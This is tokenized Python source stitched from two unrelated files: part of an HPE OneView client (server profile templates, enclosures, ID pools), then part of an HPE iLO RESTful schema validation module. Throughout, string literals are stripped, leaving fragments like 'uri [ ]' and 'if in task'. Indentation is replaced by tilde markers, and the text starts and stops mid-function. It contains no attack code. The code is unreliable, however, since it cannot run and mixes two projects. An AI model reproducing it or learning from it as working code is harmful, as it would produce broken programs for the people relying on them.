~~~ """\n        Create a ServerProfileTemplateV1 dictionary for use with the V200 API\n        Args:\n            name:\n                Unique name of the Server Profile Template\n            description:\n                Description of the Server Profile Template\n            serverProfileDescription:\n                The description of the server profiles created from this template.\n            serverHardwareTypeUri:\n                Identifies the server hardware type for which the Server Profile\n                was designed. The serverHardwareTypeUri is determined when the\n                profile is created.\n            enclosureGroupUri:\n                 Identifies the enclosure group for which the Server Profile Template\n                 was designed. The enclosureGroupUri is determined when the profile\n                 template is created and cannot be modified.\n            affinity:\n                This identifies the behavior of the server profile when the server\n                hardware is removed or replaced. This can be set to \'Bay\' or\n                \'BayAndServer\'.\n            hideUnusedFlexNics:\n                This setting controls the enumeration of physical functions that do\n                not correspond to connections in a profile.\n            profileConnectionV4:\n                An array of profileConnectionV4\n            firmwareSettingsV3:\n                FirmwareSettingsV3 dictionary that defines the firmware baseline\n                and management.\n            bootSettings:\n                Dictionary that indicates that the server will attempt to boot from\n                this connection. This object can only be specified if\n                "boot.manageBoot" is set to \'true\'\n            bootModeSetting:\n                Dictionary that describes the boot mode settings to be configured on\n                Gen9 and newer servers.\n\n        Returns: dict\n        """ \n 
profile_template = make_ServerProfileTemplateV1 ( name , \n 
description , \n 
serverProfileDescription , \n 
serverHardwareTypeUri , \n 
enclosureGroupUri , \n 
affinity , \n 
hideUnusedFlexNics , \n 
profileConnectionV4 , \n 
firmwareSettingsV3 , \n 
bootSettings , \n 
bootModeSetting ) \n 
\n 
task , body = self . _con . post ( uri [ ] , profile_template ) \n 
tout = 600 \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
profile_template = self . _con . get ( entity [ ] ) \n 
return profile_template \n 
~~ ~~ return task \n 
\n 
~~ def remove_server_profile_template ( self , profile_template , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . delete ( profile_template [ ] ) \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
return task \n 
~~ return body \n 
\n 
~~ def get_server_profile_templates ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def get_server_profile_template_by_name ( self , name ) : \n 
~~~ body = self . _con . get_entity_byfield ( uri [ ] , , name ) \n 
return body \n 
\n 
~~ def update_server_profile_template ( self , profile_template , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . put ( profile_template [ ] , profile_template ) \n 
tout = 600 \n 
# Update the task to get the associated resource uri \n 
if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = tout , verbose = verbose ) \n 
~~ profileTemplateResource = self . _activity . get_task_associated_resource ( task ) \n 
profile = self . _con . get ( profileTemplateResource [ ] ) \n 
return profile_template \n 
\n 
~~ def get_server_profile_from_template ( self , profile_template ) : \n 
~~~ profile = self . _con . get ( profile_template [ ] + ) \n 
return profile \n 
\n 
########################################################################### \n 
# Enclosures \n 
########################################################################### \n 
~~ def get_enclosures ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return get_members ( body ) \n 
\n 
~~ def add_enclosure ( self , enclosure , blocking = True , verbose = False ) : \n 
~~~ task , body = self . _con . post ( uri [ ] , enclosure ) \n 
if enclosure [ ] is : \n 
~~~ tout = 600 \n 
~~ elif enclosure [ ] is None : \n 
~~~ tout = 600 \n 
~~ else : \n 
~~~ tout = 3600 \n 
\n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout , verbose = verbose ) \n 
if in task and task [ ] . startswith ( ) : \n 
~~~ entity = self . _activity . get_task_associated_resource ( task ) \n 
enclosure = self . _con . get ( entity [ ] ) \n 
return enclosure \n 
~~ ~~ return task \n 
\n 
~~ def remove_enclosure ( self , enclosure , force = False , blocking = True , \n 
verbose = False ) : \n 
~~~ if force : \n 
~~~ task , body = self . _con . delete ( enclosure [ ] + ) \n 
~~ else : \n 
~~~ task , body = self . _con . delete ( enclosure [ ] ) \n 
~~ if blocking is True : \n 
~~~ task = self . _activity . wait4task ( task , tout = 600 , verbose = verbose ) \n 
~~ return task \n 
\n 
########################################################################### \n 
# Enclosure Groups \n 
########################################################################### \n 
~~ def create_enclosure_group ( self , associatedLIGs , name , \n 
powerMode = ) : \n 
~~~ """ Create an EnclosureGroupV200 dictionary\n\n        Args:\n            associatedLIGs:\n                A sorted list of logical interconnect group URIs associated with\n                the enclosure group.\n            name:\n                The name of the enclosure group.\n            powerMode:\n                Power mode of the enclosure group. Values are \'RedundantPowerFeed\'\n                or \'RedundantPowerSupply\'.\n\n        Returns: enclosure group\n        """ \n 
egroup = make_EnclosureGroupV200 ( associatedLIGs , name , powerMode ) \n 
# Creating an Enclosure Group returns the group, NOT a task \n 
task , body = self . _con . post ( uri [ ] , egroup ) \n 
return body \n 
\n 
~~ def delete_enclosure_group ( self , egroup ) : \n 
~~~ self . _con . delete ( egroup [ ] ) \n 
\n 
~~ def get_enclosure_groups ( self ) : \n 
~~~ return get_members ( self . _con . get ( uri [ ] ) ) \n 
\n 
~~ def update_enclosure_group ( self , enclosuregroup ) : \n 
~~~ task , body = self . _con . put ( enclosuregroup [ ] , enclosuregroup ) \n 
return body \n 
\n 
########################################################################### \n 
# ID Pools \n 
########################################################################### \n 
~~ def get_pool ( self , pooltype ) : \n 
~~~ body = self . _con . get ( uri [ ] + + pooltype ) \n 
return body \n 
\n 
~~ def get_vmac_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_vwwn_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_vsn_pool ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_networks ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_schema ( self ) : \n 
~~~ return self . _con . get ( uri [ ] ) \n 
\n 
~~ def get_profile_available_servers ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_available_storage_systems ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
~~ def get_profile_ports ( self ) : \n 
~~~ body = self . _con . get ( uri [ ] ) \n 
return body \n 
\n 
# TODO put pool \n 
~~ def allocate_pool_ids ( self , url , count ) : \n 
~~~ allocatorUrl = % url \n 
allocatorBody = { : count } \n 
task , body = self . _con . put ( allocatorUrl , allocatorBody ) \n 
return body \n 
\n 
~~ def release_pool_ids ( self , url , idList ) : \n 
~~~ collectorUrl = % url \n 
collectorBody = { : idList } \n 
task , body = self . _con . put ( collectorUrl , collectorBody ) \n 
return body \n 
\n 
~~ def allocate_range_ids ( self , allocatorUrl , count ) : \n 
~~~ task , body = self . _con . put ( allocatorUrl , { : count } ) \n 
return body \n 
\n 
~~ def release_range_ids ( self , collectorUrl , idList ) : \n 
~~~ task , body = self . _con . put ( collectorUrl , { : idList } ) \n 
return body \n 
\n 
# TODO POST Range \n 
~~ def enable_range ( self , url ) : \n 
~~~ prange = self . _con . get ( url ) \n 
prange [ ] = True \n 
task , body = self . _con . put ( url , prange ) \n 
return body \n 
\n 
~~ def disable_range ( self , url ) : \n 
~~~ prange = self . _con . get ( url ) \n 
prange [ ] = False \n 
task , body = self . _con . put ( url , prange ) \n 
return body \n 
\n 
# vim:set shiftwidth=4 tabstop=4 expandtab textwidth=79: \n 
### \n 
# Copyright 2016 Hewlett Packard Enterprise, Inc. All rights reserved. \n 
#  \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
#  \n 
#  http://www.apache.org/licenses/LICENSE-2.0 \n 
#  \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
### \n 
\n 
# -*- coding: utf-8 -*- \n 
~~ ~~ """RIS Schema classes""" \n 
\n 
# ---------Imports--------- \n 
\n 
import os \n 
import re \n 
import sys \n 
import json \n 
import locale \n 
import zipfile \n 
import logging \n 
import textwrap \n 
import validictory \n 
\n 
from . sharedtypes import JSONEncoder \n 
from ilorest . rest . v1_helper import ( RisObject ) \n 
\n 
# ---------End of imports--------- \n 
\n 
\n 
# ---------Debug logger--------- \n 
\n 
LOGGER = logging . getLogger ( __name__ ) \n 
\n 
# ---------End of debug logger--------- \n 
\n 
\n 
class ValidationError ( Exception ) : \n 
~~~ """Validation Class Error""" \n 
pass \n 
\n 
\n 
~~ class SchemaValidationError ( ValidationError ) : \n 
~~~ """Schema Validation Class Error""" \n 
pass \n 
\n 
\n 
~~ class RegistryValidationError ( ValidationError ) : \n 
~~~ """Registration Validation Class Error""" \n 
def __init__ ( self , msg , regentry = None , selector = None ) : \n 
~~~ super ( RegistryValidationError , self ) . __init__ ( msg ) \n 
self . reg = regentry \n 
self . sel = selector \n 
\n 
\n 
~~ ~~ class UnknownValidatorError ( Exception ) : \n 
~~~ """Raised when we find an attribute type that we don\'t know how to""" \n 
""" validate. """ \n 
\n 
\n 
~~ class ValidationManager ( object ) : \n 
~~~ """Keep track of all the schemas and registries and provides helpers""" \n 
""" to simplify validation """ \n 
def __init__ ( self , local_path , bios_local_path , romfamily = None , biosversion = None , iloversion = None , monolith = None ) : \n 
~~~ super ( ValidationManager , self ) . __init__ ( ) \n 
\n 
defaultilopath = None \n 
defaultbiospath = None \n 
schemamainfolder = None \n 
\n 
if float ( iloversion ) < 2.10 : \n 
~~~ if os . name == : \n 
~~~ defaultilopath = r".\\hp-rest-classes-ilo4" \n 
defaultbiospath = r".\\hp-rest-classes-bios" \n 
schemamainfolder = os . path . dirname ( sys . executable ) \n 
~~ else : \n 
~~~ defaultilopath = "/usr/share/hprest/hp-rest-classes-ilo4" \n 
defaultbiospath = "/usr/share/hprest/hp-rest-classes-bios" \n 
schemamainfolder = "/usr/share/hprest/" \n 
\n 
# iLO schema location defaults \n 
~~ if not local_path : \n 
~~~ if not os . path . isdir ( defaultilopath ) : \n 
~~~ ilozip = self . getiloziplocation ( schemamainfolder , iloversion ) \n 
\n 
if ilozip and os . path . exists ( ilozip ) : \n 
~~~ with zipfile . ZipFile ( os . path . join ( schemamainfolder , ilozip ) , "r" ) as zfile : \n 
~~~ zfile . extractall ( os . path . join ( schemamainfolder , "hp-rest-classes-ilo4" ) ) \n 
\n 
~~ local_path = os . path . join ( schemamainfolder , ) \n 
~~ else : \n 
~~~ raise SchemaValidationError ( ) \n 
~~ ~~ else : \n 
~~~ local_path = defaultilopath \n 
~~ ~~ else : \n 
~~~ if not os . path . isdir ( local_path ) : \n 
~~~ raise SchemaValidationError ( u"iLO schema directory \'%s\' " \n 
"doesn\'t exist" % local_path ) \n 
\n 
# bios schema location defaults \n 
~~ ~~ if not bios_local_path : \n 
~~~ if not os . path . isdir ( defaultbiospath ) : \n 
~~~ bioszip = self . getbiosziplocation ( romfamily , schemamainfolder , biosversion ) \n 
if bioszip and os . path . exists ( bioszip ) : \n 
~~~ with zipfile . ZipFile ( \n 
os . path . join ( schemamainfolder , bioszip ) , "r" ) as zfile : \n 
~~~ zfile . extractall ( os . path . join ( schemamainfolder , "hp-rest-classes-bios" ) ) \n 
\n 
~~ bios_local_path = os . path . join ( schemamainfolder , ) \n 
~~ else : \n 
~~~ raise SchemaValidationError ( ) \n 
~~ ~~ else : \n 
~~~ bios_local_path = defaultbiospath \n 
~~ ~~ else : \n 
~~~ if not os . path . isdir ( bios_local_path ) : \n 
~~~ raise SchemaValidationError ( u"Bios schema directory \'%s\' " "doesn\'t exist" % bios_local_path ) \n 
~~ ~~ ~~ else : \n 
~~~ if monolith . is_redfish : \n 
~~~ local_path = "/redfish/v1/Schemas/" \n 
bios_local_path = "/redfish/v1/Registries/" \n 
~~ else : \n 
~~~ local_path = "/rest/v1/Schemas" \n 
bios_local_path = "/rest/v1/Registries" \n 
\n 
# iLO schema and registry lists \n 
~~ ~~ self . _schema_locations = list ( ) \n 
self . _classes = list ( ) \n 
self . _registry_locations = list ( ) \n 
self . _classes_registry = list ( ) \n 
\n 
# iLO schema and registry lists \n 
self . _bios_schema_locations = list ( ) \n 
self . _bios_classes = list ( ) \n 
self . _bios_registry_locations = list ( ) \n 
self . _bios_classes_registry = list ( ) \n 
\n 
# iLO and base error messages \n 
self . _ilo_messages = list ( ) \n 
self . _base_messages = list ( ) \n 
self . _hpcommon_messages = list ( ) \n 
self . _iloevents_messages = list ( ) \n 
\n 
# error \n 
self . _errors = list ( ) \n 
\n 
#strings for v1/redfish \n 
if monolith . is_redfish : \n 
~~~ self . _schemaid = [ "/redfish/v1/schemas" , "Members" ] \n 
self . _regid = [ "/redfish/v1/registries" , "Members" ] \n 
~~ else : \n 
~~~ self . _schemaid = [ "/rest/v1/schemas" , "Items" ] \n 
self . _regid = [ "/rest/v1/registries" , "Items" ] \n 
\n 
~~ if local_path : \n 
~~~ self . add_location ( schema_path = local_path , monolith = monolith ) \n 
self . add_location ( registry_path = local_path , monolith = monolith ) \n 
\n 
~~ if bios_local_path : \n 
~~~ self . add_location ( schema_path = bios_local_path , biossection = True , monolith = monolith ) \n 
self . add_location ( registry_path = bios_local_path , biossection = True , monolith = monolith ) \n 
\n 
~~ ~~ def getbiosziplocation ( self , romfamily , schemadir , biosversion ) : \n 
~~~ """Helper function for BIOS zip location from schema directory\n\n        :param romfamily: the current systems rom family.\n        :type romfamily: str.\n        :param schemadir: the current configuration schema directory.\n        :type schemadir: str.\n        :param biosversion: the current system BIOS version.\n        :type biosversion: str.\n\n        """ \n 
foundfile = None \n 
currentver = None \n 
\n 
tempstr = "hp-rest-classes-bios-" + romfamily + "-" + biosversion \n 
\n 
for _ , _ , filenames in os . walk ( schemadir ) : \n 
~~~ for filename in filenames : \n 
~~~ if tempstr in filename : \n 
~~~ regentry = re . compile ( % tempstr ) \n 
mentry = regentry . search ( filename ) \n 
\n 
if mentry and currentver : \n 
~~~ if currentver < mentry . group ( 1 ) : \n 
~~~ foundfile = filename \n 
currentver = mentry . group ( 1 ) \n 
~~ ~~ elif mentry and not currentver : \n 
~~~ foundfile = filename \n 
currentver = mentry . group ( 1 ) \n 
\n 
~~ ~~ ~~ ~~ if foundfile : \n 
~~~ return os . path . join ( schemadir , foundfile ) \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ def getiloziplocation ( self , schemadir , iloversion ) : \n 
~~~ """Helper function for iLO zip location from schema directory\n\n        :param schemadir: the current configuration schema directory.\n        :type schemadir: str.\n        :param iloversion: the current system iLO version.\n        :type iloversion: str.\n\n        """ \n 
if float ( iloversion ) < 2.10 : \n 
~~~ iloversion = \n 
\n 
~~ tempstr = "hp-rest-classes-ilo4-" + iloversion . replace ( "." , "" ) \n 
\n 
for _ , _ , filenames in os . walk ( schemadir ) : \n 
~~~ for filename in filenames : \n 
~~~ if tempstr in filename : \n 
~~~ return os . path . join ( schemadir , filename ) \n 
\n 
~~ ~~ ~~ return None \n 
\n 
~~ def add_location ( self , schema_path = None , registry_path = None , \n 
biossection = False , monolith = None ) : \n 
~~~ """Add schema_path and registry_path to the list of locations to""" \n 
""" search for schemas and registries\n\n        :param schema_path: directory or URL where schemas are located.\n        :type  schema_path: str.\n        :param registry_path: directory or URL where registries are located.\n        :type registry_path: str.\n        :param biossection: flag to determine if within BIOS section.\n        :type biossection: str.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n\n        """ \n 
if schema_path : \n 
~~~ if not biossection : \n 
~~~ self . _schema_locations . append ( schema_path ) \n 
self . _update_location_map ( monolith = monolith ) \n 
~~ else : \n 
~~~ self . _bios_schema_locations . append ( schema_path ) \n 
self . _update_location_map ( biossection = True , monolith = monolith ) \n 
~~ ~~ elif registry_path : \n 
~~~ if not biossection : \n 
~~~ self . _registry_locations . append ( registry_path ) \n 
self . _update_location_map ( registries = True , monolith = monolith ) \n 
~~ else : \n 
~~~ self . _bios_registry_locations . append ( registry_path ) \n 
self . _update_location_map ( biossection = True , registries = True , monolith = monolith ) \n 
~~ ~~ else : \n 
~~~ raise ValueError ( u"\'schema_path\' and \'registry_path\' " "are undefined" ) \n 
\n 
~~ ~~ def _update_location_map ( self , biossection = False , registries = False , \n 
monolith = None ) : \n 
~~~ """Searches locations to build a map of type to filename\n\n        :param biossection: flag to determine if within BIOS section.\n        :type biossection: str.\n        :param registries: flag to determine if within registries section.\n        :type registries: boolean.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n\n        """ \n 
locationslist = list ( ) \n 
pathjoinstr = None \n 
\n 
if not registries : \n 
~~~ pathjoinstr = "Schemas" \n 
if not biossection : \n 
~~~ locationslist = self . _schema_locations \n 
~~ else : \n 
~~~ locationslist = self . _bios_schema_locations \n 
~~ ~~ else : \n 
~~~ pathjoinstr = "Registries" \n 
if not biossection : \n 
~~~ locationslist = self . _registry_locations \n 
~~ else : \n 
~~~ locationslist = self . _bios_registry_locations \n 
\n 
~~ ~~ for location in locationslist : \n 
~~~ if monolith : \n 
~~~ self . new_load_file ( monolith , root = location , biossection = biossection , registries = registries ) \n 
~~ elif self . _is_local ( location ) : \n 
# need to set the executable bit on all SCEXEs \n 
~~~ for root , _ , filenames in os . walk ( os . path . join ( location , \n 
pathjoinstr ) ) : \n 
~~~ for filename in filenames : \n 
~~~ fqpath = os . path . abspath ( os . path . join ( os . path . normpath ( root ) , filename ) ) \n 
\n 
if self . load_file ( fqpath , root = location , biossection = biossection , registries = registries ) : \n 
~~~ LOGGER . info ( "Loaded schema mapping \'%s\'" , fqpath ) \n 
\n 
~~ ~~ ~~ ~~ ~~ ~~ def new_load_file ( self , monolith , root = None , biossection = False , registries = False ) : \n 
~~~ """Loads the types from monolith.\n\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param root: pointer to the root of the load.\n        :type root: class obj.\n        :param biossection: flag to determine if within BIOS section.\n        :type biossection: str.\n        :param registries: flag to determine if within registries section.\n        :type registries: boolean.\n\n        """ \n 
classesdataholder = [ ] \n 
\n 
for itemtype in monolith . types : \n 
~~~ if itemtype . startswith ( "#SchemaFileCollection." ) or itemtype . startswith ( "Collection." ) and in monolith . types [ itemtype ] : \n 
~~~ for instance in monolith . types [ itemtype ] [ ] : \n 
~~~ if self . _schemaid [ 0 ] in instance . resp . request . path . lower ( ) or self . _regid [ 0 ] in instance . resp . request . path . lower ( ) : \n 
~~~ if not registries and self . _schemaid [ 0 ] in instance . resp . request . path . lower ( ) : \n 
~~~ if classesdataholder : \n 
~~~ if self . _schemaid [ 1 ] in instance . resp . dict : \n 
~~~ classesdataholder [ 0 ] [ self . _schemaid [ 1 ] ] . extend ( instance . resp . dict [ self . _schemaid [ 1 ] ] ) \n 
~~ ~~ else : \n 
~~~ classesdataholder . append ( instance . resp . dict ) \n 
~~ ~~ elif registries and self . _regid [ 0 ] in instance . resp . request . path . lower ( ) : \n 
~~~ if classesdataholder : \n 
~~~ if monolith . is_redfish : \n 
~~~ classesdataholder [ 0 ] [ self . _regid [ 1 ] ] . extend ( instance . resp . dict [ self . _regid [ 1 ] ] ) \n 
~~ ~~ else : \n 
~~~ classesdataholder . append ( instance . resp . dict ) \n 
\n 
~~ ~~ ~~ ~~ ~~ ~~ if classesdataholder : \n 
~~~ classesdataholder = classesdataholder [ 0 ] \n 
\n 
~~ try : \n 
~~~ if monolith . _typestring in classesdataholder and ( in classesdataholder [ monolith . _typestring ] or ( in classesdataholder [ monolith . _typestring ] and monolith . is_redfish ) ) : \n 
~~~ newclass = Classes . parse ( classesdataholder ) \n 
newclass . set_root ( root ) \n 
\n 
if not registries : \n 
~~~ if not biossection : \n 
~~~ self . _classes . append ( newclass ) \n 
~~ else : \n 
~~~ self . _bios_classes . append ( newclass ) \n 
~~ ~~ else : \n 
~~~ if not biossection : \n 
~~~ self . _classes_registry . append ( newclass ) \n 
~~ else : \n 
~~~ self . _bios_classes_registry . append ( newclass ) \n 
~~ ~~ ~~ ~~ except BaseException : \n 
~~~ pass \n 
~~ else : \n 
~~~ pass \n 
\n 
~~ ~~ def load_file ( self , filepath , root = None , biossection = False , \n 
registries = False , datareturn = False ) : \n 
~~~ """Loads the types from filepath.\n\n        :param filepath: path to a file to load, local or URL.\n        :type filepath: str.\n        :param root: root path used to reconstruct full file paths.\n        :type root: str.\n        :param biossection: flag to determine if within BIOS section.\n        :type biossection: str.\n        :param registries: flag to determine if within registries section.\n        :type registries: boolean.\n        :param datareturn: flag to determine if the raw data should be returned.\n        :type datareturn: boolean.\n\n        """ \n 
result = False \n 
if os . path . isfile ( filepath ) : \n 
~~~ try : \n 
~~~ filehand = open ( filepath , ) \n 
data = json . load ( filehand ) \n 
if datareturn : \n 
~~~ return data \n 
\n 
~~ if in data and data [ ] == : \n 
~~~ if biossection and registries : \n 
~~~ itemsreturn = self . bios_helper_function ( data , root ) \n 
data [ "Items" ] = itemsreturn \n 
\n 
~~ newclass = Classes . parse ( data ) \n 
newclass . set_root ( root ) \n 
\n 
if not registries : \n 
~~~ if not biossection : \n 
~~~ self . _classes . append ( newclass ) \n 
~~ else : \n 
~~~ self . _bios_classes . append ( newclass ) \n 
~~ ~~ else : \n 
~~~ if not biossection : \n 
~~~ self . _classes_registry . append ( newclass ) \n 
~~ else : \n 
~~~ self . _bios_classes_registry . append ( newclass ) \n 
\n 
~~ ~~ result = True \n 
~~ ~~ except BaseException : \n 
~~~ pass \n 
~~ else : \n 
~~~ pass \n 
~~ finally : \n 
~~~ filehand . close ( ) \n 
\n 
~~ ~~ return result \n 
\n 
~~ def bios_helper_function ( self , data , root ) : \n 
~~~ """Helper function for BIOS schemas\n\n        :param data: current retrieved data for BIOS.\n        :type data: str.\n        :param root: root path used to reconstruct full file paths.\n        :type root: str.\n\n        """ \n 
folderentries = data [ "links" ] \n 
datareturn = list ( ) \n 
\n 
for entry in folderentries [ "Member" ] : \n 
~~~ joinstr = entry [ "href" ] \n 
\n 
if os . name == and joinstr [ 0 ] == "/" : \n 
~~~ joinstr = joinstr . replace ( "/" , "\\\\" ) [ 1 : ] \n 
~~ elif joinstr [ 0 ] == "/" : \n 
~~~ joinstr = joinstr [ 1 : ] \n 
\n 
~~ for root , _ , filenames in os . walk ( os . path . join ( root , joinstr ) ) : \n 
~~~ for filename in filenames : \n 
~~~ fqpath = os . path . abspath ( os . path . join ( os . path . normpath ( root ) , filename ) ) \n 
datareturn . append ( self . load_file ( fqpath , root = root , biossection = True , registries = True , datareturn = True ) ) \n 
LOGGER . info ( "Loaded schema mapping \'%s\'" , fqpath ) \n 
\n 
~~ ~~ ~~ return datareturn \n 
\n 
~~ def validate ( self , item , selector = None , currdict = None , monolith = None , \n 
newarg = None , checkall = False , regloc = None ) : \n 
~~~ """Search for matching schemas and attribute registries and""" \n 
""" ensure that item is valid.\n\n        :param item: the item to be validated.\n        :type item: str.\n        :param selector: the type selection for the get operation.\n        :type selector: str.\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n        :param newargs: list of multi level properties to be modified.\n        :type newargs: list.\n        :param checkall: flag to determine if check all should be enabled.\n        :type checkall: boolean.\n        :param regloc: path to registry location.\n        :type regloc: str.\n\n        """ \n 
if regloc : \n 
~~~ attrreg = RepoRegistryEntry ( regloc ) \n 
~~ else : \n 
~~~ attrreg = self . find_schema ( schname = item [ monolith . _typestring ] ) \n 
\n 
~~ if attrreg : \n 
~~~ tempvalue = attrreg . validate ( item , self . _errors , selector = selector , \n 
currdict = currdict , monolith = monolith , \n 
newarg = newarg , checkall = checkall ) \n 
\n 
if tempvalue is True : \n 
~~~ return False \n 
~~ elif tempvalue : \n 
~~~ self . _errors = tempvalue \n 
\n 
~~ ~~ return True \n 
\n 
~~ def bios_validate ( self , item , regname , selector = None , currdict = None , \n 
checkall = False , monolith = None ) : \n 
~~~ """BIOS Search for matching schemas and attribute registries and""" \n 
""" ensure that item is valid\n\n        :param item: the item to be validated.\n        :type item: str.\n        :param regname: string containing the registry name.\n        :type regname: str.\n        :param selector: the type selection for the get operation.\n        :type selector: str.\n        :param currdict: current selection dictionary.\n        :type currdict: dict.\n        :param checkall: flag to determine if check all should be enabled.\n        :type checkall: boolean.\n        :param monolith: full data model retrieved from server.\n        :type monolith: dict.\n\n        """ \n 
attrreg = self . find_bios_registry ( regname = regname ) \n 
if attrreg : \n 
~~~ tempvalue = attrreg . validate_bios_version ( item , self . _errors , selector = selector , currdict = currdict , checkall = checkall , monolith = monolith ) \n 
\n 
if tempvalue == : \n 
~~~ return tempvalue \n 
~~ elif tempvalue == : \n 
~~~ return tempvalue \n 
~~ elif tempvalue : \n 
~~~ self . _errors = tempvalue \n 
\n 
~~ ~~ return True \n 
\n 
~~ def bios_info ( self , item , regname , selector ) : \n 
~~~ """BIOS Search for matching schemas and attribute registries and""" \n 
""" ensure that item is valid\n\n        :param item: the item to be validated.\n        :type item: str.\n        :param regname: string containing the registry name.\n        :type regname: str.\n        :param selector: the type selection for the get operation.\n        :type selector: str.\n\n        """ \n 
attrreg = self . find_bios_registry ( regname = regname ) \n 
\n 
if attrreg : \n 
~~~ if attrreg . validate_bios_version ( item , self . _errors , selector = selector ) : \n 
~~~ return False \n 
\n 
~~ ~~ return True \n 
\n 
~~ def find_schema ( self , schname ) : \n 
~~~ """Searches through all locations and returns the first schema""" \n 
""" found for the provided type\n\n        :param schname: string containing the schema name.\n        :type schname: str.\n\n        """ \n 
for cls in self . _classes : \n 
~~~ found = cls . find_schema ( schname = schname ) \n 
if found : \n 
~~~ return found \n 
~~ ~~ return None \n 
\n 
~~ def find_registry ( self , regname ) : \n 
~~~ """Searches through all locations and returns the first registry""" \n 
""" found for the provided type\n\n        :param regname: string containing the registry name.\n        :type regname: str.\n\n        """ \n 
for cls in self . _classes_registry : \n 
~~~ found = cls . find_registry ( regname = regname ) \n 
if found : \n 
~~~ return found \n 
\n 
~~ ~~ return None \n 
\n 
~~ def find_bios_registry ( self , regname ) : \n 
~~~ """Searches through all locations and returns the first schema found""" \n 
""" for the provided type\n\n        :param regname: string containing the registry name.\n        :type regname: str.\n\n        """ \n 
for cls in self . _bios_classes_registry : \n 
~~~ found = cls . find_bios_registry ( regname = regname ) \n 
if found : \n 
~~~ return found \n 
~~ ~~ return None \n 
\n 
~~ def get_errors ( self ) : \n 
~~~ """Return a list of errors encountered""" \n 
return self . _errors \n 
\n 
~~ def _is_local ( self , path ) : \n 
~~~ """Determine if path is a local file or remote\n\n        :param path: The path to examine.\n        :type path: str.\n\n        """ \n 
if in path : \n 
~~~ return False \n 
~~ return True \n 
\n 
\n 
~~ ~~ class Classes ( RisObject ) : \n 
~~~ """Represents an entry in the Classes registry""" \n 
def __init__ ( self , item ) : \n 
~~~ super ( Classes , self ) . __init__ ( item ) \n 
self . _root = None \n 
\n 
~~ def set_root ( self , newroot ) : \n 
~~~ """Set new root\n\n        :param newroot: new root to be set.\n        :type newroot: str.\n\n        """ \n 
self . _root = newroot \n 
\n 
~~ def find_schema ( self , schname ) : \n 
~~~ """Returns iLO schemas\n\n        :param schname: string containing the schema name.\n        :type schname: str.\n\n        """ \n 
result = None \n 
\n 
if hasattr ( self , ) and isinstance ( self . Items , list ) : \n 
~~~ for entry in self . Items : \n 
~~~ if entry and in entry and entry [ ] . lower ( ) == schname . lower ( ) : \n 
~~~ regentry = RepoRegistryEntry . parse ( entry ) \n 
regentry . set_root ( self . _root ) \n 
result = regentry \n 
break \n 
~~ ~~ ~~ elif hasattr ( self , ) and isinstance ( self . Members , list ) : \n 
~~~ schname = schname . split ( ) [ - 1 ] \n 
for entry in self . Members : \n 
~~~ schlink = entry [ ] . split ( ) \n 
schlink = schlink [ len ( schlink ) - 2 ] \n 
\n 
if schname . lower ( ) == schlink . lower ( ) : \n 
~~~ result = entry \n 
break \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def find_registry ( self , regname ) : \n 
~~~ """Returns iLO registries\n\n        :param regname: string containing the registry name.\n        :type regname: str.\n\n        """ \n 
result = None \n 
if hasattr ( self , ) and isinstance ( self . Items , list ) : \n 
~~~ for entry in self . Items : \n 
~~~ if entry and ( in entry and \n 
entry [ ] . lower ( ) . startswith ( regname . lower ( ) ) ) : \n 
~~~ regentry = RepoRegistryEntry . parse ( entry ) \n 
regentry . set_root ( self . _root ) \n 
result = regentry \n 
break \n 
~~ ~~ ~~ elif hasattr ( self , ) and isinstance ( self . Members , list ) : \n 
~~~ regname = regname . split ( ) [ - 1 ] \n 
for entry in self . Members : \n 
~~~ reglink = entry [ ] . split ( ) \n 
reglink = reglink [ len ( reglink ) - 2 ] \n 
if regname . lower ( ) == reglink . lower ( ) : \n 
~~~ result = entry \n 
break \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def find_bios_schema ( self , schname ) : \n 
~~~ """Returns BIOS schemas\n\n        :param schname: string containing the schema name.\n        :type schname: str.\n\n        """ \n 
result = None \n 
if hasattr ( self , ) and isinstance ( self . Items , list ) : \n 
~~~ for entry in self . Items : \n 
~~~ if ( in entry and entry [ ] . lower ( ) == \n 
schname . lower ( ) ) : \n 
~~~ regentry = RepoRegistryEntry . parse ( entry ) \n 
regentry . set_root ( self . _root ) \n 
result = regentry \n 
break \n 
\n 
~~ ~~ ~~ return result \n 
\n 
~~ def find_bios_registry ( self , regname ) : \n 
~~~ """Returns BIOS registries\n\n        :param regname: string containing the registry name.\n        :type regname: str.\n\n        """ \n 
result = None \n 
